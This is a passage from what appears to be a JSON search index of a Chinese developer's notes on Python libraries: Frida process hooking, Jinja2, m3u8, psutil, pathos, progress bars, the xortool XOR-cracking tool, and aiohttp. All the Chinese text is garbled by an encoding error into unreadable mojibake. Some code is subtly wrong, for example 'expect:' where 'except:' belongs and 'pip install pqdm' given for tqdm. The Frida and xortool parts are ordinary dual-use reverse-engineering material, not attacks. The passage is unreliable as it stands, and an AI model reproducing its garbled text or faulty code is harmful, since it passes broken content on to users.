æ¥è¿›è¡Œåº”ç”¨ç¨‹åºçš„åŠ¨æ€åˆ†æã€é€†å‘å·¥ç¨‹ã€æ¼æ´æŒ–æ˜ç­‰ä»»åŠ¡ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ä»£ç ç‰‡æ®µï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ \"frida\" æ¨¡å—åˆ›å»º Frida ä¼šè¯å’ŒåŠ è½½ç›®æ ‡åº”ç”¨ç¨‹åº: import frida # åˆ›å»º Frida ä¼šè¯ , ä¹Ÿå°±æ˜¯é™„åŠ åˆ°è¿›ç¨‹ session = frida.attach(\"app.exe\") # æ‰“å°ç›®æ ‡åº”ç”¨ç¨‹åºçš„è¿›ç¨‹ ID print(\"Process ID:\", session.pid) # ... # æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œå¦‚åŠ è½½è„šæœ¬ã€æ‹¦æˆªå‡½æ•°è°ƒç”¨ç­‰ # ... # å…³é—­ä¼šè¯ session.detach() éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒFrida è¿˜æä¾›äº†å…¶ä»–è¯­è¨€çš„æ”¯æŒï¼Œ å¦‚ JavaScriptã€C#ã€Swift ç­‰ï¼Œ ä½¿å¾—å¼€å‘è€…å¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½å’Œéœ€æ±‚é€‰æ‹©åˆé€‚çš„ç¼–ç¨‹è¯­è¨€è¿›è¡Œåº”ç”¨ç¨‹åºçš„åŠ¨æ€åˆ†æå’Œä¿®æ”¹ã€‚ æ³¨è§£ æ¯”å¦‚ä¾µå…¥åˆ°å¾®ä¿¡è¿›ç¨‹ä¸­æå–è¡¨æƒ…åŒ…: https://github.com/K265/frida-wechat-sticker/tree/main FRIDAä¸€èˆ¬åœ¨ç³»ç»Ÿå±‚é¢çš„è°ƒç”¨éƒ½æ˜¯JSä»£ç . fridaçš„æ³¨å…¥è„šæœ¬æ˜¯JavaScriptï¼Œ å› æ­¤æˆ‘ä»¬åé¢éƒ½æ˜¯é€šè¿‡jsè„šæœ¬æ¥æ“ä½œè®¾å¤‡ä¸Šçš„Javaä»£ç çš„ã€‚ å…¶ä»–ç‚¹: ç”±äºjsä»£ç æ³¨å…¥æ—¶å¯èƒ½ä¼šå‡ºç°è¶…æ—¶çš„é”™è¯¯ï¼Œ ä¸ºäº†é˜²æ­¢è¿™ä¸ªé—®é¢˜ï¼Œ æˆ‘ä»¬é€šå¸¸è¿˜éœ€è¦åœ¨æœ€å¤–é¢åŒ…è£…ä¸€å±‚ setImmediate(function(){}) çš„ä»£ç ã€‚ frida-å·¥å…· å…±æœ‰6ä¸ªï¼š frida CLI: æ˜¯ä¸€ä¸ªäº¤äº’å¼è§£é‡Šå™¨ï¼ˆREPLï¼‰ï¼Œä»–çš„äº¤äº’å½¢å¼è·ŸIPythonå¾ˆç±»ä¼¼ã€‚ frida-ps: ç”¨äºåˆ—å‡ºè¿›ç¨‹çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå½“æˆ‘ä»¬éœ€è¦è·Ÿè¿œç¨‹ç³»ç»Ÿè¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œè¿™ä¸ªæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ frida-trace frida-discover frida-ls-devices frida-kill å¸¸ç”¨è¾“å‡º console-æ™®é€šæ‰“å° ä¸æ™®é€šJSè¾“å‡ºä¸€è‡´: console.log('xxx') console.warn('xxx') console.error('xxx') hexdump-æ‰“å°å†…å­˜åœ°å€ä¿¡æ¯ targetå‚æ•°å¯ä»¥æ˜¯ArrayBufferæˆ–è€…NativePointer, è€Œoptionså‚æ•°åˆ™æ˜¯è‡ªå®šä¹‰è¾“å‡ºæ ¼å¼å¯ä»¥å¡«è¿™å‡ ä¸ªå‚æ•°offsetã€lengtã€headerã€ansiã€‚ ç¤ºä¾‹: var libc = Module.findBaseAddress('libc.so'); console.log(hexdump(libc, { offset: 0, length: 64, header: true, ansi: true })); sendå›è°ƒ-Python sendæ˜¯åœ¨pythonå±‚å®šä¹‰çš„on_messageå›è°ƒå‡½æ•°ï¼Œ jscodeå†…æ‰€æœ‰çš„ä¿¡æ¯éƒ½è¢«ç›‘æ§script.on('message', on_message)ï¼Œ å½“è¾“å‡ºä¿¡æ¯çš„æ—¶å€™on_messageå‡½æ•°ä¼šæ‹¿åˆ°å…¶æ•°æ®å†é€šè¿‡formatè½¬æ¢ï¼Œ å…¶æœ€é‡è¦çš„åŠŸèƒ½ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„æ˜¯èƒ½å¤Ÿç›´æ¥å°†æ•°æ®ä»¥jsonæ ¼å¼è¾“å‡ºï¼Œ å½“ç„¶æ•°æ®æ˜¯äºŒè¿›åˆ¶çš„æ—¶å€™ä¹Ÿä¾ç„¶æ˜¯å¯ä»¥ä½¿ç”¨send: # -*- coding: utf-8 -*- import frida import sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) jscode = \"\"\" Java.perform(function () { var jni_env = Java.vm.getEnv(); console.log(jni_env); send(jni_env); }); \"\"\" process = frida.get_usb_device().attach('com.roysue.roysueapplication') script = process.create_script(jscode) script.on('message', on_message) script.load() sys.stdin.read() è¿è¡Œè„šæœ¬æ•ˆæœå¦‚ä¸‹: roysue@ubuntu:~/Desktop/Chap09$ python Chap03.py [object Object] [*] {'handle': '0xdf4f8000', 'vm': {}} å¯ä»¥çœ‹å‡ºè¿™é‡Œä¸¤ç§æ–¹å¼è¾“å‡ºçš„ä¸åŒçš„æ•ˆæœï¼Œconsoleç›´æ¥è¾“å‡ºäº†[object Object]ï¼Œæ— æ³•è¾“å‡ºå…¶æ­£å¸¸çš„å†…å®¹ï¼Œå› ä¸ºjni_envå®é™…ä¸Šæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯ä½¿ç”¨sendçš„æ—¶å€™ä¼šè‡ªåŠ¨å°†å¯¹è±¡è½¬jsonæ ¼å¼è¾“å‡º å‚è€ƒ: FRIDA-APIä½¿ç”¨ç¯‡ï¼šrpcã€Processã€Moduleã€Memoryä½¿ç”¨æ–¹æ³•åŠç¤ºä¾‹ è¯¦è§£Hookæ¡†æ¶fridaï¼Œè®©ä½ åœ¨é€†å‘å·¥ä½œä¸­æ•ˆç‡æˆå€æå‡ çœ‹èµ·æ¥æœ€æ¨è: https://juejin.cn/post/7308240524964134924 å¾…çœ‹ hookå·¥å…·fridaåŸç†åŠä½¿ç”¨, Javaç¨‹åºä½¿ç”¨","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Frida.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Frida.html"},{"title":"Jinja2","text":"ä¸€ä¸ªä»¿ç…§ Django çš„æ¨¡ç‰ˆå¼•æ“, å®‰è£…: pip install Jinja2 åŠ è½½æ¨¡ç‰ˆ: >>> from jinja2 import Template as T >>> t = T('ti is a test msg, say {{ msg }}') >>> t.render(msg='you say say you') 'ti is a test msg, say you say say you' >>> éƒ¨åˆ†è¯­æ³•: ä»£ç å—: {% ä»£ç å— %} å˜é‡: {{ å˜é‡ }} æ³¨é‡Š: {# æ³¨é‡Š #} è¡Œè¯­å¥, è¡Œå†…è¯­å¥ä¸º Python ä»£ç : # è¡Œè¯­å¥ è¿‡æ»¤å™¨, ä½¿ç”¨ç®¡é“ç¬¦å·, æ”¯æŒé“¾å¼: {{ å˜é‡ | å‡½æ•°1 | å‡½æ•°2 }} ä¸€äº›é¢„å®šä¹‰å‡½æ•° å­—ç¬¦ä¸²æ“ä½œ: safe, ç¦ç”¨è½¬ä¹‰ capitalize, æŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ lower, æŠŠå€¼è½¬æˆå°å†™ upper, æŠŠå€¼è½¬æˆå¤§å†™ title, æŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ reverse, å­—ç¬¦ä¸²åè½¬ format, æ ¼å¼åŒ–è¾“å‡º striptags, æ¸²æŸ“ä¹‹å‰æŠŠå€¼ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾éƒ½åˆ æ‰ truncate: å­—ç¬¦ä¸²æˆªæ–­ åˆ—è¡¨æ“ä½œ: first, å–ç¬¬ä¸€ä¸ªå…ƒç´  last, å–æœ€åä¸€ä¸ªå…ƒç´  length, è·å–åˆ—è¡¨é•¿åº¦ sum, åˆ—è¡¨æ±‚å’Œ sort, åˆ—è¡¨æ’åº å¸¸ç”¨é€»è¾‘: åˆ¤æ–­: {% if æ¡ä»¶ %} æ­¤å¤„å¯ä»¥æ˜¯html ä»£ç  {% endif %} æ³¨æ„ç­‰ä»·äº: # if æ¡ä»¶ æ­¤å¤„å¯ä»¥æ˜¯html ä»£ç  # endif å¾ªç¯: {% for x in åˆ—è¡¨ %} æ­¤å¤„å¯ä»¥æ˜¯html ä»£ç  {% endfor %}","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Jinja2.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Jinja2.html"},{"title":"m3u8","text":"pypiå®˜ç½‘åœ°å€: https://pypi.org/project/m3u8/ å®‰è£…: pip install m3u8 åª’ä½“æ–‡ä»¶è½¬æ¢ä¸ºm3u8æ ¼å¼. ä¸€èˆ¬ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/ffmpeg ä¸€èµ·ä½¿ç”¨. åŠ è½½m3u8æ–‡ä»¶, å‚æ•°ä¸ºæœ¬åœ°ä½ç½®æˆ–ç½‘ç»œurl: m3u8.load(file_or_url)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-M3U8.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-M3U8.html"},{"title":"psutil","text":"ä¾¿æ·çš„ç³»ç»Ÿç›‘æ§å·¥å…·. å®‰è£…: pip install psutil è·å–cpuä¿¡æ¯ è·å–cpuä¿¡æ¯: psutil.cpu_times() è·å–å†…å­˜ä¿¡æ¯ ä½¿ç”¨psutilè·å–ç‰©ç†å†…å­˜å’Œäº¤æ¢å†…å­˜ä¿¡æ¯ï¼Œåˆ†åˆ«ä½¿ç”¨: psutil.virtual_memory() psutil.swap_memory() è·å–ç£ç›˜ä¿¡æ¯ å¯ä»¥é€šè¿‡psutilè·å–ç£ç›˜åˆ†åŒºã€ç£ç›˜ä½¿ç”¨ç‡å’Œç£ç›˜IOä¿¡æ¯: psutil.disk_partitions() # ç£ç›˜åˆ†åŒºä¿¡æ¯ psutil.disk_usage('/') # ç£ç›˜ä½¿ç”¨æƒ…å†µ psutil.disk_io_counters() # ç£ç›˜IO è·å–ç½‘ç»œä¿¡æ¯ psutilå¯ä»¥è·å–ç½‘ç»œæ¥å£å’Œç½‘ç»œè¿æ¥ä¿¡æ¯: psutil.net_io_counters() # è·å–ç½‘ç»œè¯»å†™å­—èŠ‚ï¼åŒ…çš„ä¸ªæ•° psutil.net_if_addrs() # è·å–ç½‘ç»œæ¥å£ä¿¡æ¯ psutil.net_if_stats() # è·å–ç½‘ç»œæ¥å£çŠ¶æ€ è¦è·å–å½“å‰ç½‘ç»œè¿æ¥ä¿¡æ¯ï¼Œä½¿ç”¨net_connections(): psutil.net_connections() è‹¥æƒé™ä¸è¶³éœ€è¦è·å–æƒé™, å¦‚ sudo å¯åŠ¨ (å› ä¸ºä¼šè°ƒç”¨ç³»ç»Ÿçš„æ¥å£) è·å–è¿›ç¨‹ä¿¡æ¯ é€šè¿‡psutilå¯ä»¥è·å–åˆ°æ‰€æœ‰è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯: >>> psutil.pids() # æ‰€æœ‰è¿›ç¨‹ID [3865, 3864, 3863, 3856, 3855, 3853, 3776, ..., 45, 44, 1, 0] >>> p = psutil.Process(3776) # è·å–æŒ‡å®šè¿›ç¨‹ID=3776ï¼Œå…¶å®å°±æ˜¯å½“å‰Pythonäº¤äº’ç¯å¢ƒ >>> p.name() # è¿›ç¨‹åç§° 'python3.6' >>> p.exe() # è¿›ç¨‹exeè·¯å¾„ '/Users/michael/anaconda3/bin/python3.6' >>> p.cwd() # è¿›ç¨‹å·¥ä½œç›®å½• '/Users/michael' >>> p.cmdline() # è¿›ç¨‹å¯åŠ¨çš„å‘½ä»¤è¡Œ ['python3'] >>> p.ppid() # çˆ¶è¿›ç¨‹ID 3765 >>> p.parent() # çˆ¶è¿›ç¨‹ <psutil.Process(pid=3765, name='bash') at 4503144040> >>> p.children() # å­è¿›ç¨‹åˆ—è¡¨ [] >>> p.status() # è¿›ç¨‹çŠ¶æ€ 'running' >>> p.username() # è¿›ç¨‹ç”¨æˆ·å 'michael' >>> p.create_time() # è¿›ç¨‹åˆ›å»ºæ—¶é—´ 1511052731.120333 >>> p.terminal() # è¿›ç¨‹ç»ˆç«¯ '/dev/ttys002' >>> p.cpu_times() # è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´ pcputimes(user=0.081150144, system=0.053269812, children_user=0.0, children_system=0.0) >>> p.memory_info() # è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ pmem(rss=8310784, vms=2481725440, pfaults=3207, pageins=18) >>> p.open_files() # è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ [] >>> p.connections() # è¿›ç¨‹ç›¸å…³ç½‘ç»œè¿æ¥ [] >>> p.num_threads() # è¿›ç¨‹çš„çº¿ç¨‹æ•°é‡ 1 >>> p.threads() # æ‰€æœ‰çº¿ç¨‹ä¿¡æ¯ [pthread(id=1, user_time=0.090318, system_time=0.062736)] >>> p.environ() # è¿›ç¨‹ç¯å¢ƒå˜é‡ {'SHELL': '/bin/bash', 'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:...', 'PWD': '/Users/michael', 'LANG': 'zh_CN.UTF-8', ...} >>> p.terminate() # ç»“æŸè¿›ç¨‹ Terminated: 15 <-- è‡ªå·±æŠŠè‡ªå·±ç»“æŸäº† å’Œè·å–ç½‘ç»œè¿æ¥ç±»ä¼¼ï¼Œè·å–ä¸€ä¸ªrootç”¨æˆ·çš„è¿›ç¨‹éœ€è¦rootæƒé™ï¼Œå¯åŠ¨Pythonäº¤äº’ç¯å¢ƒæˆ–è€….pyæ–‡ä»¶æ—¶ï¼Œéœ€è¦sudoæƒé™ã€‚ psutilè¿˜æä¾›äº†ä¸€ä¸ªtest()å‡½æ•°ï¼Œå¯ä»¥æ¨¡æ‹Ÿå‡ºpså‘½ä»¤çš„æ•ˆæœ: >>> import psutil >>> psutil.test() USER PID %MEM VSZ RSS TTY START TIME COMMAND root 0 24.0 74270628 2016380 ? Nov18 40:51 kernel_task root 1 0.1 2494140 9484 ? Nov18 01:39 launchd root 44 0.4 2519872 36404 ? Nov18 02:02 UserEventAgent root 45 ? 2474032 1516 ? Nov18 00:14 syslogd root 47 0.1 2504768 8912 ? Nov18 00:03 kextd root 48 0.1 2505544 4720 ? Nov18 00:19 fseventsd _appleeven 52 0.1 2499748 5024 ? Nov18 00:00 appleeventsd root 53 0.1 2500592 6132 ? Nov18 00:02 configd ... ä½¿ç”¨æŠ€å·§ ä¾‹å¦‚ç”¨æ¥å›æ”¶è‡ªå·±æ®‹ç•™çš„å­è¿›ç¨‹: _pid = os.getpid() pro = psutil.Process(_pid) pro.terminate()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-PSUTIL.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-PSUTIL.html"},{"title":"pathos","text":"githubåœ°å€:: pathos-github å®˜æ–¹æ–‡æ¡£:: pathos-doc å®˜ç½‘ä¸‹è½½æ–‡æ¡£(pdf):: pythos-pdf <../../../../resources/pdf/1202.1056.pdf> githubå¼€å¤´å°±è¯´æä¾›ä¸€ä¸ªå¹¶è¡Œçš„å›¾å½¢åŒ–ç®¡ç†... æ²¡çœ‹æ‡‚... ä¸‹æœ‰ç”¨æ¨¡å—: dill: serialize all of Python pox: utilities for filesystem exploration and automated builds klepto: persistent caching to memory, disk, or database multiprocess: better multiprocessing and multithreading in Python ppft: distributed and parallel Python pyina: MPI parallel map and cluster scheduling pathos: graph management and execution in heterogeneous computing æœ‰ç”¨çš„æ–¹æ³•/ç±» pathos.abstract_launcher [worker pool API å®šä¹‰] pathos.pools [æ‰€æœ‰ pathos worker pools] pathos.core [é«˜çº§å‘½ä»¤æ¥å£] pathos.hosts [hostname æ³¨å†Œæ¥å£] pathos.serial.SerialPool [python ä¸²è¡Œ worker pool] pathos.parallel.ParallelPool [python å¹¶è¡Œ worker pool] pathos.multiprocessing.ProcessPool [the multiprocessing worker pool] pathos.threading.ThreadPool [the multithreading worker pool] pathos.connection.Pipe [the launcher base class] pathos.secure.Pipe [the secure launcher base class] pathos.secure.Copier [the secure copier base class] pathos.secure.Tunnel [the secure tunnel base class] pathos.selector.Selector [the selector base class] pathos.server.Server [the server base class] pathos.profile [profiling in threads and processes] pathos.maps [standalone map instances] åŒæ—¶æä¾›äº†ä¸¤ä¸ªå‘½ä»¤, æ”¯æŒä¾¿æ·å»ºç«‹å®‰å…¨è¿æ¥, è„šæœ¬å·²å®‰è£…åˆ°ç¯å¢ƒå˜é‡ä¸‹, æ‰€ä»¥ç›´æ¥å‘½ä»¤è°ƒç”¨å³å¯. portpicker [get the portnumber of an open port] pathos_connect [establish tunnel and/or RPC server] ä½¿ç”¨ --help è·å–å¸®åŠ©ä¿¡æ¯.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Pathos.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Pathos.html"},{"title":"progress","text":"å®‰è£…: pip install progress å…³äºè¿›åº¦æ¡å¯å‚è§: ProgressInPy ä¸»è¦æ˜¯ç”¨æ¥ progress.bar åšè¿›åº¦æ¡æ§åˆ¶çš„: from progress.bar import Bar def print_hi(): n = 10000 with Bar('è¿›åº¦', max=n) as bar: for i in range(n): for j in range(n): j += i bar.next() æ•ˆæœ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Progress.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Progress.html"},{"title":"tqdm","text":"ä¹Ÿæ˜¯ç”¨æ¥åšè¿›åº¦æ§åˆ¶çš„ å…³äºè¿›åº¦æ¡å¯å‚è§: ProgressInPy å®‰è£…: pip install pqdm ä¾‹å­: from tqdm import tqdm, trange def print_hi(): n = 10000 # ä¹Ÿå¯ä»¥ # for i in trange(n): for i in tqdm(range(n)): for j in range(n): j += i æ•ˆæœ: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 10000/10000 [00:02<00:00, 4132.14it/s] è¿˜å¯ä»¥è·Ÿ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/rich ä¸€èµ·å¼„å½©è‰²è¿›åº¦æ¡ ä¹Ÿå¯ä»¥ä¸ notebook, tkç­‰ä¸€èµ·: # å½©è‰²è¿›åº¦ from tqdm.rich import tqdm, trange # å…¼å®¹ jupyter from tqdm.notebook import tqdm, trange # tkè¿›åº¦æ¡ from tqdm.tk import tqdm, trange å¦‚æœæ˜¯éå¾ªç¯ä»£ç çš„è¿›åº¦æ¡, ç›´æ¥å®šä¹‰tqdmå¯¹è±¡å³å¯: bar = tqdm(total=100) ... bar.update(10) ... bar.update(30) ... ...","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-TQDM.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-TQDM.html"},{"title":"xortool","text":"å®‰è£…: pip install xortool xortool æ˜¯ä¸€ä¸ªç”¨äºåˆ†æå’Œç ´è§£ XOR å¯†ç çš„ Python å·¥å…·ã€‚ XORï¼ˆå¼‚æˆ–ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŠ å¯†ç®—æ³•ï¼Œå®ƒå°†æ˜æ–‡ä¸ä¸€ä¸ªå¯†é’¥è¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ï¼Œä»è€Œäº§ç”Ÿå¯†æ–‡ã€‚ xortool æ—¨åœ¨è‡ªåŠ¨åŒ–åˆ†æ XOR å¯†æ–‡å¹¶å°è¯•æ‰¾åˆ°å¯†é’¥ï¼Œä»¥ä¾¿è§£å¯†æ•°æ®ã€‚ ä½¿ç”¨ xortoolï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œ XOR å¯†ç åˆ†æï¼š å¯†æ–‡é¢‘ç‡åˆ†æï¼šxortool å¯ä»¥åˆ†æå¯†æ–‡çš„é¢‘ç‡åˆ†å¸ƒï¼Œå¹¶æ ¹æ®å­—ç¬¦å‡ºç°çš„é¢‘ç‡çŒœæµ‹å¯†é’¥çš„é•¿åº¦ã€‚ å¯†é’¥é•¿åº¦çŒœæµ‹ï¼šxortool æä¾›äº†å‡ ç§è‡ªåŠ¨çŒœæµ‹å¯†é’¥é•¿åº¦çš„æ–¹æ³•ï¼Œ åŒ…æ‹¬æŒ‡æ•°é‡å¤å¯†é’¥é•¿åº¦æ£€æµ‹ï¼ˆIndex of Coincidenceï¼‰å’Œæœ€é•¿é‡å¤å­—ä¸²é•¿åº¦æ£€æµ‹ï¼ˆLongest Repeated Substringï¼‰ã€‚ å¯†é’¥æœç´¢ï¼šxortool å°†ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥æœç´¢å¯èƒ½çš„å¯†é’¥ï¼ŒåŒ…æ‹¬æš´åŠ›ç ´è§£å’ŒåŸºäºå¯†æ–‡é¢‘ç‡çš„çŒœæµ‹ã€‚ è§£å¯†ç»“æœè¾“å‡ºï¼šä¸€æ—¦æ‰¾åˆ°å¯èƒ½çš„å¯†é’¥ï¼Œxortool å¯ä»¥å°†è§£å¯†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶æˆ–ç»ˆç«¯ã€‚ xortool æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå°¤å…¶é€‚ç”¨äºç®€å•çš„ XOR åŠ å¯†å’Œå°å¯†é’¥é•¿åº¦ã€‚ ç„¶è€Œï¼Œå¯¹äºæ›´å¤æ‚çš„åŠ å¯†ç®—æ³•å’Œé•¿å¯†é’¥é•¿åº¦ï¼Œxortool çš„æ•ˆæœå¯èƒ½ä¼šå—åˆ°é™åˆ¶ã€‚ è¿™æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·: xortool file.bin","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Xortool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Xortool.html"},{"title":"aiohttp","text":"å®˜ç½‘:: Welcome to AIOHTTP å¼‚æ­¥çš„ç½‘ç»œè¿æ¥åº“ , å†…éƒ¨å­˜åœ¨ asyncio åº“çš„è°ƒç”¨, å¦‚ run_in_executor å®‰è£…: pip install aiohttp é»˜è®¤çš„ç¼–ç åº“ charset-normalizer è¾ƒæ…¢, å¯ä½¿ç”¨ cchardet æ›¿ä»£: $ pip install cchardet ç®—äº†, ç°åœ¨ cchardet å·²ç»æ²¡ç»´æŠ¤äº†, ä¸æ”¯æŒå¤§äº 3.10 çš„ç‰ˆæœ¬. å»ºè®®å®‰è£… aiodns åº“, æ›´å¿«çš„ dns è§£æ: pip install aiodns aiohttp.web.Application åˆ›å»ºwebæœåŠ¡å™¨æ‰€ç”¨ç±» å¢åŠ è·¯å¾„æ˜ å°„: app = Application() app.router.add_static() é™¤äº† add_static, è¿˜æœ‰ add_get ç­‰ æˆ–è€…ä½¿ç”¨ç›´æ¥ç»™æ•´ä¸ªè·¯å¾„çš„åˆ—è¡¨: app.add_routes([ web.get('/', handle), web.get('/{name}', handle) ]) serverå¤„ç† ä¸€ä¸ªserverå¤„ç†ç¤ºä¾‹: from aiohttp import web async def handle(request): name = request.match_info.get('name', \"Anonymous\") text = \"Hello, \" + name return web.Response(text=text) app = web.Application() app.add_routes([web.get('/', handle), web.get('/{name}', handle)]) åœ¨aiohttpçš„webåº”ç”¨ä¸­,handlerå‡½æ•°æ¥å—çš„requestæ˜¯aiohttp.web.Requestå¯¹è±¡ã€‚ aiohttp.web.Requestå¯¹è±¡åŒ…å«äº†å®¢æˆ·ç«¯å‘æ¥çš„HTTPè¯·æ±‚çš„æ‰€æœ‰è¯¦æƒ…,æˆ‘ä»¬å¯ä»¥ä»ä¸­è·å–: - è¯·æ±‚æ–¹æ³•(method) - è¯·æ±‚URL(url) - è¯·æ±‚å¤´(headers) - è¯·æ±‚ä½“(body) - Queryå‚æ•°(query) - ç­‰ç­‰ å¯ä»¥è¿™æ ·å¤„ç†: async def handle_rpc(request: aiohttp.web.Request): method = request.method url = request.url headers = request.headers query = request.query # è·å–queryå‚æ•° # è·å–è¯·æ±‚ä½“ data = await request.text() # è·å–å­—ç¬¦ä¸² data = await request.read() # è·å–byteæµ data = await request.json() # è·å–JSON # æ„é€ å“åº” response = aiohttp.web.Response(text='result') return response ä¸¾ä¾‹ å®¢æˆ·ç«¯ä»£ç ä¸¾ä¾‹: import aiohttp import asyncio async def main(): async with aiohttp.ClientSession() as session: async with session.get('http://python.org') as response: print(\"Status:\", response.status) print(\"Content-type:\", response.headers['content-type']) html = await response.text() print(\"Body:\", html[:15], \"...\") loop = asyncio.get_event_loop() loop.run_until_complete(main()) server ä»£ç ä¸¾ä¾‹: from aiohttp import web async def handle(request): name = request.match_info.get('name', \"Anonymous\") text = \"Hello, \" + name return web.Response(text=text) app = web.Application() app.add_routes([web.get('/', handle), web.get('/{name}', handle)]) if __name__ == '__main__': web.run_app(app) ä½¿ç”¨ get è¯·æ±‚ä¸¾ä¾‹: async def main_aiohttp(): async with aiohttp.request(method='get', url='https://docs.aiohttp.org/en/stable/') as r: print(r) if __name__ == '__main__': import aiohttp asyncio.run(main_aiohttp()) ä¸€äº›è¯´æ˜ æœ€è¿‘å¼€å‘çš„æ—¶å€™é‡åˆ°ç½‘ç»œåº“çš„é—®é¢˜, èƒŒæ™¯å¦‚ä¸‹: å…¬å¸è‡ªå·±æœ‰åŸºäº C çš„ GUI åº“, è¿™ä¸ªåº“è¢«ç¼–è¯‘ä¸ºäº† Python æ¡†æ¶, ç„¶åé‡å†™äº† asyncio çš„äº‹ä»¶å¾ªç¯(ä¸ºäº†ç»“åˆè¿™ä¸ªæ¡†æ¶çš„äº‹ä»¶å¾ªç¯) å‘ç°åœ¨ä½¿ç”¨ loop.run_in_executor æ—¶, ä¸”ä¼ å…¥çš„å‡½æ•°ä¸º requests çš„è°ƒç”¨æ—¶: def try_connect(address: str): try: with requests.get(address): return True expect: return False ä¸”åœ¨ è™šæ‹Ÿæœº/äº‘æ¡Œé¢ è¿è¡Œæ—¶, ä¼šå­˜åœ¨å¼‚å¸¸, æ­¤å¤„çš„ expect å¯ä»¥è¯´æ˜¯æ— æ•ˆ, çœ‹ç€æ˜¯è¿™ä¸ªå¼‚å¸¸å¯¼è‡´åé¢å“ªæœ‰é—®é¢˜. ä¹Ÿçœ‹ä¸äº†å †æ ˆä¿¡æ¯. debug åˆä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜. æ€»ç»“ä¸‹æ¥å°±æ˜¯, ä¸¢åˆ°çº¿ç¨‹æ± æ‰§è¡Œå™¨å†…éƒ¨æ‰§è¡Œ, ä¸” requests.get å­˜åœ¨å¼‚å¸¸æ—¶, ä¸”å¹³å°ä¸ºè™šæ‹Ÿæœºæ—¶, ä¸€å®šä¼šè§¦å‘. åé¢æœ‰ç©ºçœ‹çœ‹å®˜æ–¹è‡ªå·±çš„äº‹ä»¶å¾ªç¯æœ‰æ²¡æœ‰è¿™ä¸ªé—®é¢˜. æœ€åæ¢äº† aiohttp å°±è§£å†³äº†. è¿˜ä¸ç¡®å®šæ˜¯ requests åº“æœ¬èº«çš„é—®é¢˜, 